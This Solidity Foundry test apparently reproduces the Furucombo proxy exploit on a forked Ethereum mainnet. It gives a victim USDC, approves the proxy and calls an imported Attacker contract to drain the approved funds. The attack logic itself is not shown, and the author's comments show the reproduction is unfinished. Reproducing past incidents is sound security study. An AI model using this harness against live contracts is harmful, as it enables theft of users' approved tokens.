// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Attacker.sol";
import "../src/Proxy.sol";
import "forge-std/console.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract CounterTest is Test {

    address user = makeAddr("user");
    address attackerEOA = makeAddr("attacker");
    Attacker attacker;
    IProxy furucomboProxy;
    IAaveV2Proxy aaveV2Proxy;
    IERC20 usdc;

    function setUp() public {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpc, 11_940_499);
        
        furucomboProxy = IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
        aaveV2Proxy = IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        attacker = new Attacker();

        deal(address(usdc), user, 5000 * 10 ** 6);

        vm.prank(user);
        usdc.approve(address(furucomboProxy), 5000 * 10 ** 6);

    }

    function test_isValid() public {
        bytes32 HANDLER_REGISTRY_SLOT = 0x6874162fd62902201ea0f4bf541086067b3b88bd802fac9e150fd2d1db584e19;
        address addr = address(uint160(uint256(vm.load(address(furucomboProxy), HANDLER_REGISTRY_SLOT))));
        console.log("Registry address: %s", addr);
        bool result = IRegistry(addr).isValid(address(aaveV2Proxy));
        require(result);
    }

    function test_attack() public {
        vm.startPrank(attackerEOA);
        
        attacker.setup();
        attacker.attack(usdc, user);
        uint balance = usdc.balanceOf(attackerEOA);
        // 找不到為什麼地址跑去這裡＠＠
        console.log("0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38 balance: %s", usdc.balanceOf(address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)));
        // 0
        console.log("attackerEOA balance: %s", balance);

        // assertEq(balance, 5000 * 10 ** 6);
        vm.stopPrank();
    }
}
